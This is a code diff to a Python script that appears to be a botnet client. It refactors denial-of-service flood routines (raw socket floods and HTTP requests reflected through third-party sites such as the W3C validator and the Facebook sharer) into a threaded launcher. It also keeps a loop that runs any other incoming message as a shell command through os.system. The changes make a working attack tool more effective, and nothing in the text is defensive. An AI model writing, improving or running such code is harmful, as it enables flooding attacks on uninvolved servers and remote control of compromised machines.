@@ -23,14 +23,15 @@ def req_ddos(ip, item):
         except:
             pass
 def sockddos(ip, port):
-    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    msg = f"GET / HTTP/1.1\nHost: {ip}\n\nUser-Agent: {random.choice(useragents)}".encode('utf-8')
     while True:
         try:
-            task = q2.get()
-            msg = f"GET / HTTP/1.1\nHost: {ip}\n\nUser-Agent: {random.choice(useragents)}".encode('utf-8')
+            ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             ddos.connect((ip, int(port)))
+            task = q2.get()
             ddos.send(msg)
             time.sleep(0.1)
+            ddos.close()
             q2.task_done()
         except:
             pass
@@ -44,6 +45,27 @@ def get_bots():
 	bots.append("http://validator.w3.org/check?uri=")
 	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
 	return(bots)
+def ddos_start(ip, port, thread):
+    global q1
+    global q2
+    global item
+    while True:
+        for i in range(thread):
+            dos1 = threading.Thread(target=req_ddos, args=(ip, item))
+            dos1.daemon = True
+            dos1.start()
+            dos2 = threading.Thread(target=sockddos, args=(ip, port))
+            dos2.daemon = True
+            dos2.start()
+        while True:
+            if item > 1800:
+                item = 0
+                time.sleep(0.1)
+            item += 1
+            q1.put(item)
+            q2.put(item)
+        q1.join()
+        q2.join()
 get_bots()
 while True:
     try:
@@ -53,31 +75,16 @@ while True:
             msg = msg.split()
             target = msg[1]
             try:
-                port = msg[2]
+                port = int(msg[2])
             except:
                 port = 80
             try:
-                thr = msg[3]
+                thr = int(msg[3])
             except:
                 thr = 123
             item = 0
-            while True:
-                for i in range(thr):
-                    dos1 = threading.Thread(target=req_ddos, args=(target, item))
-                    dos1.daemon = True
-                    dos1.start()
-                    dos2 = threading.Thread(target=sockddos, args=(target, port))
-                    dos2.daemon = True
-                    dos2.start()
-                while True:
-                    if item > 1800:
-                        item = 0
-                        time.sleep(0.1)
-                    item += 1
-                    q1.put(item)
-                    q2.put(item)
-                q1.join()
-                q2.join()
+            ddos = threading.Thread(target=ddos_start, args=(target, port, thr))
+            ddos.start()
         else:
             os.system(msg)
     except:
